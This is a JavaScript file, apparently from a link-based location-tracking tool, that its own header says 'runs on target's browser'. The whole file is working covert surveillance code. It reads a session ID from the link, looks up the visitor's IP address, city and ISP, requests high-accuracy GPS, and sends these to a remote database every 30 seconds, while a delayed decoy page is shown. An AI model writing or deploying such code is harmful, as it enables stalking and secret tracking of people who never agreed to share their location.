// ═══════════════════════════════════════════════════════════
// TRACKER — runs on target's browser
// ═══════════════════════════════════════════════════════════

(() => {
  'use strict';

  console.log('🎯 tracker.js loaded');

  const PING_INTERVAL = 30000;
  let db;
  let sessionId;

  function getSessionId() {
    const params = new URLSearchParams(window.location.search);
    return params.get('s') || params.get('id');
  }

  async function isSessionActive(id) {
    const { data } = await db
      .from('sessions')
      .select('is_active')
      .eq('id', id)
      .single();
    return data?.is_active === true;
  }

  async function getIPLocation() {
    // Try ipwho.is
    try {
      const res = await fetch('https://ipwho.is/');
      if (res.ok) {
        const d = await res.json();
        if (d.success !== false) {
          return {
            ip: d.ip,
            latitude: d.latitude,
            longitude: d.longitude,
            city: d.city,
            region: d.region,
            country: d.country,
            isp: d.connection?.isp || d.connection?.org || 'Unknown',
            timezone: d.timezone?.id || 'Unknown',
          };
        }
      }
    } catch (e) { console.debug('ipwho.is failed'); }

    // Fallback: ipapi.co
    try {
      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const d = await res.json();
        return {
          ip: d.ip,
          latitude: d.latitude,
          longitude: d.longitude,
          city: d.city,
          region: d.region,
          country: d.country_name,
          isp: d.org || 'Unknown',
          timezone: d.timezone || 'Unknown',
        };
      }
    } catch (e) { console.debug('ipapi.co failed'); }

    // Fallback: freeipapi.com
    try {
      const res = await fetch('https://freeipapi.com/api/json/');
      if (res.ok) {
        const d = await res.json();
        return {
          ip: d.ipAddress,
          latitude: d.latitude,
          longitude: d.longitude,
          city: d.cityName,
          region: d.regionName,
          country: d.countryName,
          isp: 'Unknown',
          timezone: d.timeZone || 'Unknown',
        };
      }
    } catch (e) { console.debug('freeipapi failed'); }

    return null;
  }

  function getGPSLocation() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) { resolve(null); return; }
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          gpsAccuracy: pos.coords.accuracy,
        }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
      );
    });
  }

  async function sendPing() {
    if (!sessionId) return;

    const active = await isSessionActive(sessionId);
    if (!active) { console.debug('Session inactive'); return; }

    const ipLoc = await getIPLocation();
    if (!ipLoc) { console.debug('No IP location'); return; }

    const gps = await getGPSLocation();

    const record = {
      session_id: sessionId,
      ip: ipLoc.ip,
      latitude: gps?.latitude ?? ipLoc.latitude,
      longitude: gps?.longitude ?? ipLoc.longitude,
      city: ipLoc.city,
      region: ipLoc.region,
      country: ipLoc.country,
      isp: ipLoc.isp,
      timezone: ipLoc.timezone,
      accuracy: gps ? `gps (±${Math.round(gps.gpsAccuracy)}m)` : 'ip (~5-25km)',
      raw_data: { ip: ipLoc, gps: gps || null },
    };

    const { error } = await db.from('locations').insert(record);
    if (error) {
      console.debug('Ping failed:', error.message);
    } else {
      console.debug('📍 Ping sent');
    }
  }

  function showContent() {
    setTimeout(() => {
      const l = document.getElementById('loading');
      const c = document.getElementById('content');
      if (l) l.style.display = 'none';
      if (c) c.classList.remove('hidden');
    }, 2500);
  }

  async function init() {
    sessionId = getSessionId();
    if (!sessionId) { console.debug('No session ID'); return; }

    try {
      db = getSupabase();
    } catch (e) {
      console.error('Supabase init failed:', e);
      return;
    }

    const active = await isSessionActive(sessionId);
    if (!active) { console.debug('Session not active'); return; }

    showContent();
    await sendPing();
    setInterval(sendPing, PING_INTERVAL);
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) sendPing();
    });
  }

  init();
})();
